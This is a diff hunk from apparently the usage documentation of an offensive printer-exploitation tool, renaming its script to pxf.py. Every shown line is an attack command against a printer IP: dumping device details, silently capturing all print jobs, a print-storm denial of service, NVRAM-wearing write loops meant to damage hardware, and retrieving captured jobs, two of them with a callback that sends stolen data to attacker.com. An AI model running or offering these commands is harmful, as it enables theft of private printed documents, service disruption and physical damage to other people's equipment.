@@ -20,25 +20,25 @@ This technique bypasses all network-level firewalls that allow outbound HTTP, an
 
 ```bash
 # Information disclosure — extract printer ID, firmware, serial
-python printerxpl-forge.py 192.168.1.100 --xsp info
+python pxf.py 192.168.1.100 --xsp info
 
 # Job capture — silently capture all print jobs going forward
-python printerxpl-forge.py 192.168.1.100 --xsp capture
+python pxf.py 192.168.1.100 --xsp capture
 
 # DoS — print storm (resource exhaustion)
-python printerxpl-forge.py 192.168.1.100 --xsp dos
+python pxf.py 192.168.1.100 --xsp dos
 
 # NVRAM damage (physical wear via write loop)
-python printerxpl-forge.py 192.168.1.100 --xsp nvram
+python pxf.py 192.168.1.100 --xsp nvram
 
 # Retrieve previously captured jobs
-python printerxpl-forge.py 192.168.1.100 --xsp exfil
+python pxf.py 192.168.1.100 --xsp exfil
 
 # With callback URL for automatic data exfiltration
-python printerxpl-forge.py 192.168.1.100 --xsp capture \
+python pxf.py 192.168.1.100 --xsp capture \
   --xsp-callback https://attacker.com/recv
 
-python printerxpl-forge.py 192.168.1.100 --xsp info \
+python pxf.py 192.168.1.100 --xsp info \
   --xsp-callback https://attacker.com/recv
 ```
 
